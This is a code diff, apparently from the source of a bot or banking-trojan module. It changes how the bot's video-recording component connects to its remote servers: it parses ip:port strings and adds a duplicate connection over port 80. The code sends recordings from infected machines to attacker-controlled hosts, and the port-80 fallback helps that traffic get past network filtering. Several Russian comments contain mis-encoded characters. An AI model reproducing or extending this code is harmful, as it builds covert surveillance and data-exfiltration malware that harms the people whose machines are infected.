@@ -801,6 +801,24 @@ DWORD WINAPI CallbackCmd( DWORD server, DWORD cmd, char* inData, int lenInData, 
 	return res;
 }
 
+//анализирует строку ip:port, возвращает номер порта и айпи (если порт не указан, то порт по умолчанию)
+static int GetPortIp( const char* adr, char* ip )
+{
+	char* p = STR::Scan( adr, ':' );
+	int len;
+	int port = VIDEORECORD_DEFAULT_PORT;
+	if( p )
+	{
+		len = p - adr;
+		port = m_atoi( p + 1 );
+	}
+	else
+		len = m_lstrlen(adr);
+	m_memcpy( ip, adr, len );
+	ip[len] = 0;
+	return port;
+}
+
 bool Start()
 {
 	dll = new TVideoRecDLL();
@@ -808,13 +826,18 @@ bool Start()
 	m_memset( servers, 0, sizeof(servers) );
 	//запускаем менеджер видео процесса в режиме сп€чки, т. е. соедин€тьс€ с сервером будет только по команде
 	//или при передаче данных
-	VDRDBG( "Video", "Start manager ip '%s'", VIDEO_REC_HOST1 );
-	servers[0] = dll->Init( Bot->UID().t_str(), TVideoRecDLL::Hibernation, VIDEO_REC_HOST1, VIDEORECORD_DEFAULT_PORT, 0 );
+	char ip[128];
+	int port = GetPortIp( VIDEO_REC_HOST1, ip );
+	VDRDBG( "Video", "Start manager ip %s:%d", ip, port );
+	servers[0] = dll->Init( Bot->UID().t_str(), TVideoRecDLL::Hibernation, ip, port, 0 );
 	if( servers[0] )
 	{
 		VDRDBG( "Video", "ћенеджер инициализирован" );
-		dll->AddIPServer( servers[0], VIDEO_REC_HOST2, VIDEORECORD_DEFAULT_PORT );
-		VDRDBG( "Video", "Add server ip '%s'", VIDEO_REC_HOST2 );
+		if( port != 80 )
+			dll->AddIPServer( servers[0], ip, 80 ); //добавл€ем такой же сервер но поключение идет через 80-й порт
+		port = GetPortIp( VIDEO_REC_HOST2, ip );
+		dll->AddIPServer( servers[0], ip, port );
+		VDRDBG( "Video", "Add server ip %s:%d", ip, port );
 		char namePipe[64];
 		pipe = PIPE::CreateProcessPipe( GetNamePipe(namePipe), false );
 		if( pipe )
